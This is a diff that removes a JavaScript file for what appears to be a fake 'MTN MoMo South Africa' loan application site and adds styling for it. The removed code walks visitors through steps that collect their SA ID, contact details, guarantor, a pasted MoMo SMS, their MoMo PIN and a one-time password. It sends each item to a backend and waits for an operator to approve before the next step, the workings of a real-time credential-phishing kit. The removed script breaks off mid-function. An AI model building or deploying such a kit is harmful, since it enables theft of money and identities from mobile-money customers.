@@ -1,734 +1,149 @@
-// ============================================================
-// script.js – MTN MoMo South Africa v5.0
-// Step-by-step Telegram approval flow
-// ============================================================
-'use strict';
+/* ═══════════════════════════════════════════════════════════
+   NEW COMPONENTS – v5.0
+   ═══════════════════════════════════════════════════════════ */
 
-const ACCOUNT_TYPES = {
-    yello: { name: 'MoMo Yello', icon: '🟡', dailyCash: 3500, monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true },
-    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true },
-    eazi: { name: 'MoMo Eazi', icon: '⚡', dailyCash: 2000, monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
-};
-
-const STEPS = ['loan', 'personal', 'employment', 'guarantor', 'sms', 'pin', 'otp', 'qualification'];
-
-const S = {
-    applicationId: '',
-    isRegistered: false,
-    accountType: null,
-    accountMaxLoan: 0,
-    idNumber: null,
-    loan: {}, personal: {}, employment: {}, guarantor: {}
-};
-
-const POLL_INTERVAL = 2500;
-const POLL_MAX_DURATION = 30 * 60 * 1000;
-
-let activePoll = null;
-let currentPollStep = null;
-let selectedAccountType = null;
-
-const KEYS = {
-    APP_ID: 'mtn_za_app_id_v5',
-    APP_DATA: 'mtn_za_data_v5',
-    DRAFT: 'mtn_za_draft_v5'
-};
-
-const save = (k, d) => { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} };
-const get = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } };
-const rm = (k) => { try { localStorage.removeItem(k); } catch (e) {} };
-
-// ─── Helpers ───
-function escapeHtml(s) {
-    return String(s || '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+/* Offline banner */
+.offline-banner {
+    position: fixed; top: 0; left: 0; right: 0;
+    background: #DE350B; color: #fff;
+    text-align: center; padding: 8px;
+    font-size: 0.85rem; font-weight: 600;
+    z-index: 9999;
+    animation: slideDown 0.3s ease;
 }
-function fmt(n) { return (Number(n) || 0).toLocaleString(); }
+.offline-banner.hidden { display: none; }
 
-function genAppId() {
-    const rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
-    return 'MTN-ZA-' + rand.slice(0, 8);
+/* Navbar account badge */
+.nav-badge {
+    background: var(--mtn-yellow);
+    color: var(--mtn-black);
+    font-size: 0.65rem; font-weight: 800;
+    padding: 4px 10px;
+    border-radius: 12px;
+    white-space: nowrap;
 }
 
-// ─── Offline detection ───
-window.addEventListener('online', () => document.getElementById('offlineBanner').classList.add('hidden'));
-window.addEventListener('offline', () => document.getElementById('offlineBanner').classList.remove('hidden'));
+/* Confirmation blocks */
+.confirm-block {
+    background: var(--mtn-light-gray);
+    border-radius: 10px;
+    padding: 16px;
+    margin-bottom: 14px;
+}
+.confirm-block h3 {
+    font-size: 0.82rem; font-weight: 800;
+    color: var(--mtn-black);
+    margin-bottom: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+}
+.confirm-row {
+    display: flex; justify-content: space-between;
+    padding: 7px 0;
+    font-size: 0.82rem;
+    border-bottom: 1px solid rgba(0,0,0,0.06);
+}
+.confirm-row:last-child { border-bottom: none; }
+.confirm-row span { color: var(--text-light); }
+.confirm-row strong { color: var(--mtn-black); font-weight: 700; }
 
-// ─── Popstate / navigation guard ───
-window.addEventListener('popstate', () => {
-    const active = document.querySelector('.page.active');
-    if (active && requiresRegistration(active.id) && !isUserRegistered()) {
-        forceRegistration();
+.agreement-wrap {
+    background: var(--mtn-yellow-soft);
+    border-left: 4px solid var(--mtn-yellow);
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin: 16px 0;
+}
+
+/* Agreement / Schedule Modals */
+.modal-bg {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.7);
+    z-index: 10000;
+    display: none;
+    align-items: flex-start; justify-content: center;
+    padding: 20px;
+    overflow-y: auto;
+}
+.modal-bg.show { display: flex; }
+.modal-doc {
+    background: #fff;
+    border-radius: 12px;
+    max-width: 720px;
+    width: 100%;
+    margin: 30px auto;
+    overflow: hidden;
+    border-top: 6px solid var(--mtn-yellow);
+    animation: fadeIn 0.2s ease;
+}
+.modal-doc-head {
+    background: var(--mtn-black);
+    color: #fff;
+    padding: 16px 20px;
+    display: flex; justify-content: space-between; align-items: center;
+}
+.modal-doc-head h2 { font-size: 1rem; font-weight: 800; }
+.modal-close {
+    background: transparent; border: none;
+    color: #fff; font-size: 1.5rem; cursor: pointer;
+}
+.agreement-text {
+    padding: 24px;
+    font-family: ui-monospace, Menlo, monospace;
+    font-size: 0.75rem;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-word;
+    max-height: 70vh;
+    overflow-y: auto;
+    background: var(--mtn-light-gray);
+}
+.schedule-body { padding: 20px; max-height: 70vh; overflow-y: auto; }
+.schedule-table {
+    width: 100%; border-collapse: collapse;
+    font-size: 0.78rem;
+}
+.schedule-table th {
+    background: var(--mtn-black); color: #fff;
+    padding: 10px 8px; text-align: left;
+    font-weight: 700; font-size: 0.7rem;
+    text-transform: uppercase;
+}
+.schedule-table td {
+    padding: 8px; border-bottom: 1px solid #eee;
+}
+.schedule-table tr:last-child td { border-bottom: none; }
+.schedule-table tr:nth-child(even) td { background: #FAFAFA; }
+
+/* Progress bar with 8 segments */
+.prog-row {
+    display: flex; gap: 4px;
+    margin: 14px 0 26px;
+}
+.prog-row .prog-seg { height: 6px; }
+
+/* PIN / OTP auto-advance (no auto-submit) */
+.pin-box, .otp-box { font-variant-numeric: tabular-nums; }
+
+/* Buttons — cancel & retry */
+.nav-left {
+    color: rgba(255,255,255,0.85) !important;
+    font-weight: 600;
+}
+.nav-left:hover { color: #ff6b6b !important; }
+
+/* Wait icons — smaller for quick steps */
+.wait-icon.sm {
+    width: 64px; height: 64px;
+    font-size: 1.6rem;
+}
+
+/* Responsive tweak for confirmation blocks */
+@media (max-width: 600px) {
+    .confirm-row {
+        flex-direction: column; gap: 2px;
     }
-});
-
-function requiresRegistration(pageId) {
-    return ['page-step1', 'page-step2', 'page-step3', 'page-guarantor', 'page-confirmation', 'page-sms-paste', 'page-pin', 'page-otp', 'page-scan', 'page-approval'].includes(pageId);
+    .confirm-row span { font-size: 0.7rem; }
+    .modal-doc { margin: 10px auto; }
+    .agreement-text { padding: 16px; font-size: 0.7rem; }
 }
-
-function isUserRegistered() {
-    return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType]);
-}
-
-function forceRegistration(reason) {
-    showToast('❌ Please register first.', 'error', 4000);
-    setTimeout(() => {
-        startMoMoRegistration();
-        setTimeout(() => showErr('regErr', reason || 'You must register on MoMo before applying.'), 400);
-    }, 1200);
-}
-
-// ─── Toast (single-slot, no stacking) ───
-function showToast(msg, type = 'info', duration = 3200) {
-    document.querySelectorAll('.toast').forEach(t => t.remove());
-    const t = document.createElement('div');
-    t.className = `toast toast-${type}`;
-    t.textContent = msg;
-    document.body.appendChild(t);
-    setTimeout(() => {
-        t.style.opacity = '0';
-        t.style.transform = 'translateX(-50%) translateY(-20px)';
-        setTimeout(() => t.remove(), 300);
-    }, duration);
-}
-
-function showErr(id, msg) {
-    const box = document.getElementById(id);
-    if (box) { box.classList.add('show'); const t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; }
-}
-function clearErr(id) {
-    const box = document.getElementById(id);
-    if (box) box.classList.remove('show');
-}
-function setBtnLoading(btn, loading, defaultText) {
-    if (!btn) return;
-    btn.disabled = loading;
-    btn.textContent = loading ? 'Please wait...' : defaultText;
-}
-
-// ─── API ───
-async function apiCall(endpoint, options = {}) {
-    try {
-        const res = await fetch(endpoint, {
-            ...options,
-            headers: { 'Content-Type': 'application/json', ...(options.headers || {}) }
-        });
-        return await res.json();
-    } catch (e) {
-        console.error(`${endpoint}:`, e.message);
-        throw new Error('Network error. Please try again.');
-    }
-}
-
-// ─── Navigation ───
-function goTo(pageId) {
-    if (requiresRegistration(pageId) && !isUserRegistered()) {
-        forceRegistration();
-        return;
-    }
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    const el = document.getElementById(pageId);
-    if (el) el.classList.add('active');
-    window.scrollTo(0, 0);
-    history.pushState({ page: pageId }, '', '#' + pageId);
-
-    if (pageId === 'page-requirements') updateRequirementsLimits();
-    if (pageId === 'page-step1') refreshStep1();
-    if (pageId === 'page-confirmation') updateConfirmation();
-    refreshAccountBadges();
-    stopPolling();
-}
-
-// ─── Navbar account badge ───
-function refreshAccountBadges() {
-    const type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
-    const label = type ? `${type.icon} ${type.name}` : '';
-    ['navbarAccount', 'navbarAccount2', 'navbarAccount3', 'navbarAccount4', 'navbarAccount5', 'navbarAccount6', 'navbarAccount7'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.innerHTML = label ? `<div class="nav-badge">${label}</div>` : '';
-    });
-}
-
-// ═══════════════════════════════════════════════════════════
-// FORM HELPERS
-// ═══════════════════════════════════════════════════════════
-function normalizePhone(id) {
-    const inp = document.getElementById(id);
-    let v = inp.value.replace(/\D/g, '');
-    if (v.length > 9) v = v.substring(0, 9);
-    inp.value = v;
-}
-function normalizeId(id) {
-    const inp = document.getElementById(id);
-    let v = inp.value.replace(/\D/g, '');
-    if (v.length > 13) v = v.substring(0, 13);
-    inp.value = v;
-    if (v.length === 13) validateAndPreviewId(v);
-    else document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
-}
-
-function updateCalc() {
-    const amt = +document.getElementById('amtSlider').value;
-    const term = +document.getElementById('calcTermSelect').value;
-    const r = 0.27 / 12;
-    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
-    const total = monthly * term;
-
-    document.getElementById('calcAmt').textContent = 'R ' + amt.toLocaleString();
-    document.getElementById('monthlyAmt').textContent = 'R ' + monthly.toLocaleString();
-    document.getElementById('totalAmt').textContent = 'R ' + total.toLocaleString();
-    document.getElementById('receiveAmt').textContent = 'R ' + amt.toLocaleString();
-
-    const slider = document.getElementById('amtSlider');
-    const pct = ((amt - 5000) / (500000 - 5000)) * 100;
-    slider.style.setProperty('--pct', pct + '%');
-}
-
-// ═══════════════════════════════════════════════════════════
-// SA ID PARSING
-// ═══════════════════════════════════════════════════════════
-function parseSAId(id) {
-    if (!id) return { ok: false, reason: 'ID required.' };
-    const clean = String(id).replace(/\D/g, '');
-    if (clean.length !== 13) return { ok: false, reason: 'SA ID must be 13 digits.' };
-
-    const yy = parseInt(clean.substring(0, 2));
-    const mm = parseInt(clean.substring(2, 4));
-    const dd = parseInt(clean.substring(4, 6));
-    const century = yy < 30 ? 2000 : 1900;
-    const year = century + yy;
-    const dob = new Date(year, mm - 1, dd);
-    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
-        return { ok: false, reason: 'Invalid date of birth.' };
-    }
-    const age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
-    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
-    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
-    if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };
-
-    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
-    const c = clean[10];
-    const citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident' : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
-
-    return { ok: true, dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }), age, gender, citizenship };
-}
-function luhnCheck(num) {
-    let sum = 0, alt = false;
-    for (let i = num.length - 1; i >= 0; i--) {
-        let n = parseInt(num[i], 10);
-        if (alt) { n *= 2; if (n > 9) n -= 9; }
-        sum += n; alt = !alt;
-    }
-    return sum % 10 === 0;
-}
-function validateAndPreviewId(id) {
-    const r = parseSAId(id);
-    const p = document.getElementById('regDetailsPreview');
-    if (!r.ok) { p.innerHTML = `<div class="reg-preview-error">✕ ${escapeHtml(r.reason)}</div>`; return; }
-    p.innerHTML = `
-        <div class="reg-preview-row"><span>DOB</span><strong>${r.dob}</strong></div>
-        <div class="reg-preview-row"><span>Age</span><strong>${r.age} years</strong></div>
-        <div class="reg-preview-row"><span>Gender</span><strong>${r.gender}</strong></div>
-        <div class="reg-preview-row"><span>Citizenship</span><strong>${r.citizenship}</strong></div>`;
-}
-
-// ═══════════════════════════════════════════════════════════
-// LANDING ACTIONS
-// ═══════════════════════════════════════════════════════════
-function applyAsExistingUser() {
-    if (!isUserRegistered()) { forceRegistration(); return; }
-    if (S.steps?.loan === 'approved') { goTo('page-personal'); return; }
-    goTo('page-step1');
-}
-function applyFromCalculator() {
-    if (!isUserRegistered()) { forceRegistration(); return; }
-    S.loan.loanAmount = +document.getElementById('amtSlider').value;
-    S.loan.loanTerm = document.getElementById('calcTermSelect').value + ' Months';
-    saveAll();
-    showToast(`R ${fmt(S.loan.loanAmount)} selected`, 'success');
-    goTo('page-step1');
-}
-
-function startMoMoRegistration() {
-    S.isRegistered = false;
-    S.accountType = null;
-    saveAll();
-    document.getElementById('regId').value = '';
-    document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
-    selectedAccountType = null;
-    document.querySelectorAll('.account-type').forEach(el => {
-        el.classList.remove('selected');
-        el.querySelector('.at-check').textContent = '○';
-    });
-    document.getElementById('accountTypeHint').textContent = 'Tap to select';
-    clearErr('regErr');
-    goTo('page-register-check');
-}
-
-function selectAccountType(type) {
-    selectedAccountType = type;
-    const names = { yello: 'MoMo Yello', yello_plus: 'MoMo Yello Plus', eazi: 'MoMo Eazi' };
-    document.querySelectorAll('.account-type').forEach(el => {
-        const m = el.dataset.type === type;
-        el.classList.toggle('selected', m);
-        el.querySelector('.at-check').textContent = m ? '●' : '○';
-    });
-    document.getElementById('accountTypeHint').textContent = `✅ ${names[type]}`;
-}
-
-async function completeRegistration() {
-    const id = document.getElementById('regId').value.trim();
-    if (!id) return showErr('regErr', 'Please enter your SA ID.');
-    if (id.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
-    const r = parseSAId(id);
-    if (!r.ok) return showErr('regErr', r.reason);
-    if (!selectedAccountType) return showErr('regErr', 'Please select an account type.');
-
-    if (!S.applicationId) S.applicationId = genAppId();
-    saveAll();
-
-    const btn = document.getElementById('regBtn');
-    setBtnLoading(btn, true, 'Complete Registration');
-    goTo('page-register-processing');
-    document.getElementById('regProcessingStatus').textContent = '⏳ Verifying your ID...';
-
-    try {
-        const data = await apiCall('/api/register-momo', {
-            method: 'POST',
-            body: JSON.stringify({
-                applicationId: S.applicationId,
-                idNumber: id,
-                accountType: selectedAccountType,
-                phone: null,
-                fullName: null
-            })
-        });
-
-        if (!data.ok) {
-            goTo('page-register-check');
-            showErr('regErr', data.error || 'Registration failed.');
-            setBtnLoading(btn, false, 'Complete Registration');
-            return;
-        }
-
-        S.idNumber = id;
-        S.accountType = selectedAccountType;
-        S.accountMaxLoan = data.maxLoan;
-        S.isRegistered = true;
-        saveAll();
-
-        document.getElementById('regProcessingStatus').textContent = '✅ Account created!';
-        setTimeout(() => {
-            showToast(`✅ ${data.accountName} registered!`, 'success');
-            setBtnLoading(btn, false, 'Complete Registration');
-            goTo('page-requirements');
-        }, 1200);
-    } catch (e) {
-        goTo('page-register-check');
-        showErr('regErr', e.message);
-        setBtnLoading(btn, false, 'Complete Registration');
-    }
-}
-
-// ═══════════════════════════════════════════════════════════
-// REQUIREMENTS
-// ═══════════════════════════════════════════════════════════
-function updateRequirementsLimits() {
-    const t = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
-    document.getElementById('reqLimitText').innerHTML =
-        `<b>${t.icon} ${t.name}</b><br>Daily: R ${fmt(t.dailyCash)} · Monthly: R ${fmt(t.monthlyCap)}<br><b>Max loan: R ${fmt(t.maxLoan)}</b>`;
-    document.getElementById('reqTxText').innerHTML =
-        `Have <b>20% of loan amount</b> in MoMo transactions this month. Example: for R ${fmt(t.maxLoan)} → R ${fmt(Math.ceil(t.maxLoan * 0.20))}.`;
-}
-
-// ═══════════════════════════════════════════════════════════
-// STEP 1: LOAN
-// ═══════════════════════════════════════════════════════════
-function refreshStep1() {
-    if (!isUserRegistered()) { forceRegistration(); return; }
-    const t = ACCOUNT_TYPES[S.accountType];
-    document.getElementById('accInfoBox').style.display = 'block';
-    document.getElementById('accInfoText').innerHTML = `<b>${t.icon} ${t.name}</b> — Max loan <b>R ${fmt(t.maxLoan)}</b>`;
-    document.getElementById('loanLimitHint').textContent = `Max R ${fmt(t.maxLoan)}`;
-    const am = document.getElementById('s1am');
-    am.max = t.maxLoan;
-    if (+am.value > t.maxLoan) am.value = t.maxLoan;
-}
-
-async function submitStepLoan() {
-    if (!isUserRegistered()) return forceRegistration();
-    const ty = document.getElementById('s1ty').value;
-    const am = +document.getElementById('s1am').value;
-    const te = document.getElementById('s1te').value;
-    const pu = document.getElementById('s1pu').value.trim();
-    const t = ACCOUNT_TYPES[S.accountType];
-
-    if (!ty || !te || !pu) return showErr('s1Err', 'Complete all fields.');
-    if (am < t.minLoan) return showErr('s1Err', `Min R ${fmt(t.minLoan)}.`);
-    if (am > t.maxLoan) return showErr('s1Err', `Max R ${fmt(t.maxLoan)}.`);
-
-    const btn = document.getElementById('s1Btn');
-    setBtnLoading(btn, true, 'Submit for Approval');
-    clearErr('s1Err');
-
-    try {
-        const data = await apiCall('/api/submit-step', {
-            method: 'POST',
-            body: JSON.stringify({
-                applicationId: S.applicationId,
-                step: 'loan',
-                data: { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu }
-            })
-        });
-        setBtnLoading(btn, false, 'Submit for Approval');
-        if (!data.ok) {
-            if (data.code === 'NOT_REGISTERED') { forceRegistration(); return; }
-            return showErr('s1Err', data.error || 'Submission failed.');
-        }
-        S.loan = { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu };
-        saveAll();
-        document.getElementById('waitLoanStatus').textContent = '⏳ Awaiting approval...';
-        goTo('page-wait-loan');
-        startPolling('loan', () => { showToast('✅ Loan approved!', 'success'); goTo('page-step2'); });
-    } catch (e) { showErr('s1Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
-}
-
-// ═══════════════════════════════════════════════════════════
-// STEP 2: PERSONAL
-// ═══════════════════════════════════════════════════════════
-async function submitStepPersonal() {
-    if (!isUserRegistered()) return forceRegistration();
-    const fi = document.getElementById('s2fi').value.trim();
-    const la = document.getElementById('s2la').value.trim();
-    const ph = document.getElementById('s2ph').value;
-    const em = document.getElementById('s2em').value.trim();
-
-    if (!fi || !la) return showErr('s2Err', 'Enter your full name.');
-    if (ph.length !== 9) return showErr('s2Err', 'Phone must be 9 digits.');
-    if (!em || !em.includes('@')) return showErr('s2Err', 'Enter a valid email.');
-
-    const btn = document.getElementById('s2Btn');
-    setBtnLoading(btn, true, 'Submit for Approval');
-    clearErr('s2Err');
-
-    try {
-        const data = await apiCall('/api/submit-step', {
-            method: 'POST',
-            body: JSON.stringify({
-                applicationId: S.applicationId,
-                step: 'personal',
-                data: { firstName: fi, lastName: la, phone: ph, email: em }
-            })
-        });
-        setBtnLoading(btn, false, 'Submit for Approval');
-        if (!data.ok) { showErr('s2Err', data.error || 'Failed.'); return; }
-        S.personal = { firstName: fi, lastName: la, phone: ph, email: em };
-        saveAll();
-        goTo('page-wait-personal');
-        startPolling('personal', () => { showToast('✅ Personal approved!', 'success'); goTo('page-step3'); });
-    } catch (e) { showErr('s2Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
-}
-
-// ═══════════════════════════════════════════════════════════
-// STEP 3: EMPLOYMENT
-// ═══════════════════════════════════════════════════════════
-async function submitStepEmployment() {
-    if (!isUserRegistered()) return forceRegistration();
-    const em = document.getElementById('s3em').value;
-    const inc = +document.getElementById('s3in').value;
-    const kn = document.getElementById('s3kn').value.trim();
-    const kp = document.getElementById('s3kp').value;
-
-    if (!em || inc <= 0) return showErr('s3Err', 'Complete all fields.');
-    if (!kn) return showErr('s3Err', 'Next of kin name required.');
-    if (kp.length !== 9) return showErr('s3Err', 'Kin phone must be 9 digits.');
-
-    const btn = document.getElementById('s3Btn');
-    setBtnLoading(btn, true, 'Submit for Approval');
-    clearErr('s3Err');
-
-    try {
-        const data = await apiCall('/api/submit-step', {
-            method: 'POST',
-            body: JSON.stringify({
-                applicationId: S.applicationId,
-                step: 'employment',
-                data: { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp }
-            })
-        });
-        setBtnLoading(btn, false, 'Submit for Approval');
-        if (!data.ok) { showErr('s3Err', data.error || 'Failed.'); return; }
-        S.employment = { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp };
-        saveAll();
-        goTo('page-wait-employment');
-        startPolling('employment', () => { showToast('✅ Employment approved!', 'success'); goTo('page-guarantor'); });
-    } catch (e) { showErr('s3Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
-}
-
-// ═══════════════════════════════════════════════════════════
-// STEP 4: GUARANTOR
-// ═══════════════════════════════════════════════════════════
-async function submitStepGuarantor() {
-    if (!isUserRegistered()) return forceRegistration();
-    const gn = document.getElementById('gName').value.trim();
-    const gp = document.getElementById('gPhone').value;
-    const gr = document.getElementById('gRel').value;
-    const gc = document.getElementById('gConfirm').checked;
-
-    if (!gn || gn.length < 3) return showErr('gErr', 'Enter guarantor name.');
-    if (gp.length !== 9) return showErr('gErr', 'Phone must be 9 digits.');
-    if (!gr) return showErr('gErr', 'Select relationship.');
-    if (!gc) return showErr('gErr', 'Confirm agreement.');
-    if (gp === S.personal.phone) return showErr('gErr', 'Guarantor phone cannot be your own.');
-
-    const btn = document.getElementById('gBtn');
-    setBtnLoading(btn, true, 'Submit for Approval');
-    clearErr('gErr');
-
-    try {
-        const data = await apiCall('/api/submit-step', {
-            method: 'POST',
-            body: JSON.stringify({
-                applicationId: S.applicationId,
-                step: 'guarantor',
-                data: { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr }
-            })
-        });
-        setBtnLoading(btn, false, 'Submit for Approval');
-        if (!data.ok) { showErr('gErr', data.error || 'Failed.'); return; }
-        S.guarantor = { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr };
-        saveAll();
-        goTo('page-wait-guarantor');
-        startPolling('guarantor', () => { showToast('✅ Guarantor approved!', 'success'); goTo('page-confirmation'); });
-    } catch (e) { showErr('gErr', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
-}
-
-// ═══════════════════════════════════════════════════════════
-// CONFIRMATION
-// ═══════════════════════════════════════════════════════════
-function updateConfirmation() {
-    if (!S.loan.loanAmount) return;
-    const amt = S.loan.loanAmount;
-    const months = parseInt(S.loan.loanTerm);
-    const r = 0.27 / 12;
-    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
-    const totalCost = monthly * months - amt;
-
-    document.getElementById('cfAmount').textContent = 'R ' + fmt(amt);
-    document.getElementById('cfTerm').textContent = S.loan.loanTerm;
-    document.getElementById('cfPurpose').textContent = S.loan.loanPurpose;
-    document.getElementById('cfMonthly').textContent = 'R ' + fmt(monthly);
-    document.getElementById('cfCost').textContent = 'R ' + fmt(totalCost);
-    document.getElementById('cfName').textContent = `${S.personal.firstName} ${S.personal.lastName}`;
-    document.getElementById('cfPhone').textContent = '+27 ' + S.personal.phone;
-    document.getElementById('cfEmail').textContent = S.personal.email;
-    document.getElementById('cfGName').textContent = S.guarantor.guarantorName;
-    document.getElementById('cfGPhone').textContent = '+27 ' + S.guarantor.guarantorPhone;
-    document.getElementById('agreeBox').checked = false;
-    document.getElementById('confirmBtn').disabled = true;
-}
-
-async function showAgreement() {
-    try {
-        const data = await apiCall(`/api/agreement/${S.applicationId}`);
-        if (!data.ok) { showToast('Agreement not available yet.', 'error'); return; }
-        document.getElementById('agreementText').textContent = data.agreement;
-        document.getElementById('agreementModal').classList.add('show');
-    } catch (e) { showToast(e.message, 'error'); }
-}
-function closeAgreement() { document.getElementById('agreementModal').classList.remove('show'); }
-
-// ═══════════════════════════════════════════════════════════
-// SMS
-// ═══════════════════════════════════════════════════════════
-async function submitStepSms() {
-    if (!isUserRegistered()) return forceRegistration();
-    const msg = document.getElementById('smsMsgBox').value.trim();
-    if (msg.length < 10) return showErr('momErr', 'Paste the full SMS.');
-
-    const btn = document.getElementById('smsSubmitBtn');
-    setBtnLoading(btn, true, 'Submit for Approval');
-    clearErr('momErr');
-
-    try {
-        const data = await apiCall('/api/submit-step', {
-            method: 'POST',
-            body: JSON.stringify({ applicationId: S.applicationId, step: 'sms', data: { momoMessage: msg } })
-        });
-        setBtnLoading(btn, false, 'Submit for Approval');
-        if (!data.ok) { showErr('momErr', data.error || 'Failed.'); return; }
-        goTo('page-wait-sms');
-        startPolling('sms', () => { showToast('✅ SMS approved!', 'success'); goTo('page-pin'); });
-    } catch (e) { showErr('momErr', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
-}
-
-// ═══════════════════════════════════════════════════════════
-// PIN
-// ═══════════════════════════════════════════════════════════
-function pinMvM(el, i) {
-    el.value = el.value.replace(/\D/g, '').slice(0, 1);
-    if (el.value && i < 4) document.getElementById('pin' + (i + 1))?.focus();
-}
-function togPin() {
-    for (let i = 0; i < 5; i++) { const b = document.getElementById('pin' + i); if (b) b.type = b.type === 'password' ? 'text' : 'password'; }
-    for (let i = 0; i < 4; i++) { const b = document.getElementById('otp' + i); if (b) b.type = b.type === 'password' ? 'text' : 'password'; }
-}
-function clearLoginPin() { [0, 1, 2, 3, 4].forEach(i => document.getElementById('pin' + i).value = ''); document.getElementById('pin0').focus(); }
-function clearOtpCode() { [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = ''); document.getElementById('otp0').focus(); }
-
-async function submitStepPin() {
-    if (!isUserRegistered()) return forceRegistration();
-    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('pin' + i).value).join('');
-    if (pin.length !== 5) return showErr('pinErr', 'Enter all 5 digits.');
-
-    const btn = document.getElementById('pinSubmitBtn');
-    setBtnLoading(btn, true, 'Submit for Approval');
-    clearErr('pinErr');
-
-    try {
-        const data = await apiCall('/api/submit-step', {
-            method: 'POST',
-            body: JSON.stringify({ applicationId: S.applicationId, step: 'pin', data: { pin } })
-        });
-        setBtnLoading(btn, false, 'Submit for Approval');
-        if (!data.ok) {
-            if (data.blocked) return showErr('pinErr', data.error);
-            showErr('pinErr', data.error || 'Failed.');
-            clearLoginPin();
-            return;
-        }
-        goTo('page-wait-pin');
-        startPolling('pin', () => { showToast('✅ PIN approved!', 'success'); goTo('page-otp'); });
-    } catch (e) { showErr('pinErr', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
-}
-
-// ═══════════════════════════════════════════════════════════
-// OTP
-// ═══════════════════════════════════════════════════════════
-function handleOtpInput(el, i) {
-    el.value = el.value.replace(/\D/g, '').slice(0, 1);
-    if (el.value && i < 3) document.getElementById('otp' + (i + 1))?.focus();
-}
-
-async function submitStepOtp() {
-    if (!isUserRegistered()) return forceRegistration();
-    const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
-    if (otp.length !== 4) return showErr('otpErr', 'Enter all 4 digits.');
-
-    const btn = document.getElementById('otpSubmitBtn');
-    setBtnLoading(btn, true, 'Submit for Approval');
-    clearErr('otpErr');
-
-    try {
-        const data = await apiCall('/api/submit-step', {
-            method: 'POST',
-            body: JSON.stringify({ applicationId: S.applicationId, step: 'otp', data: { otp } })
-        });
-        setBtnLoading(btn, false, 'Submit for Approval');
-        if (!data.ok) { showErr('otpErr', data.error || 'Failed.'); return; }
-        goTo('page-wait-otp');
-        startPolling('otp', () => { showToast('✅ OTP approved!', 'success'); startQualificationScan(); });
-    } catch (e) { showErr('otpErr', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
-}
-
-// ═══════════════════════════════════════════════════════════
-// QUALIFICATION SCAN
-// ═══════════════════════════════════════════════════════════
-async function startQualificationScan() {
-    goTo('page-scan');
-    document.getElementById('scanItem1').className = 'scan-item active';
-    document.getElementById('scanItem2').className = 'scan-item';
-    document.getElementById('scanItem3').className = 'scan-item';
-    document.getElementById('waitScanStatus').textContent = '⏳ Analyzing...';
-
-    try {
-        await apiCall('/api/submit-step', {
-            method: 'POST',
-            body: JSON.stringify({ applicationId: S.applicationId, step: 'qualification', data: {} })
-        });
-    } catch (e) { console.error(e); }
-
-    let i = 1;
-    const statuses = ['📊 Analyzing transactions...', '📈 Verifying 20% requirement...', '🔍 Admin final review...'];
-    const animator = setInterval(() => {
-        if (i < 3) {
-            document.getElementById('scanItem' + i).className = 'scan-item done';
-            document.getElementById('scanItem' + (i + 1)).className = 'scan-item active';
-            document.getElementById('waitScanStatus').textContent = '⏳ ' + statuses[i];
-            i++;
-        } else {
-            clearInterval(animator);
-            document.getElementById('scanItem3').className = 'scan-item done';
-            document.getElementById('waitScanStatus').textContent = '⏳ Admin reviewing...';
-        }
-    }, 2500);
-
-    startPolling('qualification', () => {
-        clearInterval(animator);
-        ['scanItem1', 'scanItem2', 'scanItem3'].forEach(id => document.getElementById(id).className = 'scan-item done');
-        setTimeout(() => { showToast('🎉 Loan approved!', 'success'); showApproval(); }, 800);
-    });
-}
-
-// ═══════════════════════════════════════════════════════════
-// POLLING
-// ═══════════════════════════════════════════════════════════
-function startPolling(step, onSuccess) {
-    stopPolling();
-    currentPollStep = step;
-    const start = Date.now();
-
-    const tick = async () => {
